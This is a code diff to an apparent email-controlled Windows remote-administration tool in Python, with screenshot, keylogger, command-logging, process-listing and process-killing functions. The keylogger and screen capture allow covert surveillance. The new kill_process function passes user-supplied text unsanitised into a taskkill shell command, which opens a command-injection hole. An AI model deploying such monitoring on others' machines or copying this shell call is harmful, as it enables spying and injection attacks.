@@ -28,15 +28,15 @@ def capture_SS(file_name: str = "Picture.png") -> str:
     ext = [".png", ".jpg", ".jpeg", ".tiff", ".bmp", ".gif"]
     if not any(file_name.endswith(x) for x in ext):
         file_name += ".png"
-    
-    path = "Screenshots\\"
-    
+
+    path = "Files\\Screenshots\\"
+
     pyautogui.screenshot(path + file_name)
     return path + file_name
 
 
 def logger(duration: int) -> str:
-    file_path: str = "KeyLog\\keylog.txt"
+    file_path: str = "Files\\keylog.txt"
     # ? Ensure the existence of the file
     with open(file_path, "w") as f:
         pass
@@ -63,7 +63,7 @@ def logger(duration: int) -> str:
 
 
 def note2log(sender: str, cmd_list: list) -> str:
-    file_path: str = "Log\\mail.log"
+    file_path: str = "Files\\mail.log"
 
     with open(file_path, "a") as log:
         pass
@@ -77,8 +77,9 @@ def note2log(sender: str, cmd_list: list) -> str:
     )
 
     logging.info(f"From: {sender}, Command: {cmd_list}")
-    
+
     return file_path
+
 
 def list_command() -> str:
     content = "The supported commands:"
@@ -87,11 +88,57 @@ def list_command() -> str:
     content += "\n\t- keylog [time in seconds]"
     content += "\n\t- logout"
     content += "\n\t- shutdown [time in seconds]"
-    content += "\n\t- list apps                     (not available)"
-    content += "\n\t- list processes                (not available)"
-    content += "\n\t- kill process                  (not available)"
-    content += "\n\t- show dir                      (not available)"
-    content += "\n\t- show log"
+    content += "\n\t- listApp"
+    content += "\n\t- listProcess"
+    content += "\n\t- terminateProcess [PID/Process Name]"
+    content += "\n\t- dir                      (not available)"
+    content += "\n\t- log"
     content += "\n\t- help"
     return content
+
+
+def list_running_application():
+    file_path = "Files\\Applications.txt"
     
+    powershell_script = """
+    Get-Process | Where-Object {$_.MainWindowHandle -ne 0} | Select-Object Name, MainWindowTitle
+    """
+
+    try:
+        # Run PowerShell script
+        result = subprocess.run(
+            ["powershell", "-Command", powershell_script],
+            capture_output=True,
+            text=True,
+            check=True,
+        )
+
+        # Print the result
+        with open(file_path, "w") as f:
+            f.write(result.stdout)
+
+    except subprocess.CalledProcessError as e:
+        pass
+    return file_path
+
+def list_running_process():
+    file_path: str = "Files\\Processes.txt"
+
+    command = "tasklist"
+    result = os.popen(command).read()
+
+    with open(file_path, "w") as file:
+        file.write(result)
+
+    return file_path
+
+
+def kill_process(data: list):
+    command: str = ""
+    if str(data[0]).isdigit():
+        command = "taskkill /PID " + str(data[0]) + " /F"
+    else:
+        command = "taskkill /IM " + data[0] + " /F"
+
+    result = os.popen(command).read()
+    return result
